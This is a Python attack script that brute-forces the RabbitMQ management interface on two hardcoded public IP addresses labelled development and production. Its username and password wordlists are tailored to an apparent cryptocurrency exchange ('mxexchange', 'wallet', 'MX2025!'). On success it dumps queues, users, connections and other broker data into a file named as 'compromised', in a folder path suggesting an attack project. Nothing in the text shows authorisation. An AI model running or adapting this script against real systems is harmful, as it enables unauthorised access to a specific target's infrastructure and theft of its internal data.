import requests, json, time, itertools

host_dev = "13.76.221.253"
host_prod = "52.187.114.84"
port = 15672

# Extended wordlist for RabbitMQ
users = [
    "guest", "admin", "rabbitmq", "mx", "mxglobal", "mxexchange",
    "developer", "dev", "test", "staging", "uat", "root",
    "orderbook", "identity", "account", "wallet", "notification",
    "common", "api", "openapi", "exchange", "service", "app",
    "monitor", "grafana", "prometheus", "user", "operator",
]

passwords = [
    "guest", "admin", "password", "123456", "admin123", "rabbitmq",
    "Password1", "P@ssw0rd", "mx123", "mxglobal", "mxexchange",
    "MX2023!", "MX2024!", "MX2025!", "MX2026!", "Mx@2023",
    "developer", "dev123", "test123", "staging", "uat",
    "pass123", "changeme", "secret", "letmein", "welcome",
    "Rabbit123", "rabbit", "RabbitMQ", "rmq123",
    "P@ssword1", "Password123", "password1",
    "exchange", "Exchange1!", "Ex@change",
    "mxglobal2023", "mxglobal2024", "Mxgl0bal!",
]

for label, host in [("DEV", host_dev), ("PROD", host_prod)]:
    base = f"http://{host}:{port}"
    print(f"\n{'='*60}")
    print(f"BRUTE {label} RabbitMQ ({host}:{port})")
    print(f"Combos: {len(users)} users x {len(passwords)} passwords = {len(users)*len(passwords)}")
    print(f"{'='*60}")
    
    found = False
    count = 0
    for user in users:
        if found:
            break
        for pwd in passwords:
            count += 1
            try:
                r = requests.get(f"{base}/api/overview", auth=(user, pwd), timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    ver = data.get("rabbitmq_version", "?")
                    node = data.get("node", "?")
                    print(f"\n  [!!!] HIT #{count}: {user}:{pwd} => ACCESS GRANTED")
                    print(f"  RabbitMQ v{ver}, node={node}")
                    
                    # Full dump on success
                    dump = {"creds": f"{user}:{pwd}", "overview": data}
                    for ep in ["queues","exchanges","users","connections","vhosts","bindings","policies","channels","nodes"]:
                        try:
                            rd = requests.get(f"{base}/api/{ep}", auth=(user, pwd), timeout=8)
                            if rd.status_code == 200:
                                dump[ep] = rd.json()
                                ct = len(rd.json()) if isinstance(rd.json(), list) else 1
                                print(f"  [+] {ep}: {ct} items")
                        except:
                            pass
                    
                    fname = f"c:\\xampp\\htdocs\\pentagi\\mxexchange_attack\\rmq_{label.lower()}_compromised.json"
                    with open(fname, "w") as f:
                        json.dump(dump, f, indent=2)
                    print(f"  [+] Dump saved: {fname}")
                    found = True
                    break
                elif r.status_code != 401:
                    print(f"  [{count}] {user}:{pwd} => {r.status_code}")
            except requests.exceptions.ConnectTimeout:
                print(f"  [{count}] TIMEOUT - skipping rest of {label}")
                found = True
                break
            except Exception as e:
                print(f"  [{count}] ERROR: {e}")
                break
            
            if count % 100 == 0:
                print(f"  [{count}] ... ({user}:{pwd})")
    
    if not found:
        print(f"  [{count}] No valid creds found in {count} attempts")

print("\nDONE")
